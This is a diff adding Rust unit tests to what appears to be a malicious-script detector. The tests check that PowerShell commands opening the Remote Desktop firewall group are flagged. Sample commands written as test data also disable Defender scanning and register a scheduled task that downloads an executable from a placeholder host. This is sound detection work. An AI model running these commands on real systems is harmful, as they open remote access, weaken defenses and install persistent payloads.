@@ -30484,6 +30484,58 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
     }
 
     #[test]
+    fn powershell_remote_desktop_firewall_group_enable_emits_remote_access_trait() {
+        let script =
+            br#"powershell -Command "Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "Remote Desktop"
+            )),
+            "missing PowerShell Remote Desktop firewall group enablement: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_remote_desktop_firewall_set_enabled_emits_remote_access_trait() {
+        let script = br#"powershell -Command "Set-NetFirewallRule -DisplayGroup 'Remote Desktop' -Enabled True"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "Remote Desktop"
+            )),
+            "missing PowerShell Remote Desktop firewall set-enabled: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_remote_desktop_firewall_padded_enabled_emits_remote_access_trait() {
+        let script = br#"powershell -Command "Set-NetFirewallRule -DisplayGroup 'Remote Desktop' -Enabled 0x00000001"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "Remote Desktop"
+            )),
+            "padded PowerShell Remote Desktop firewall enablement was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_scheduled_task_delayed_url_does_not_cross_cmd_separator() {
         let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/V:ON /c set U=https://ps-task.example/p.exe&&curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
 "#;
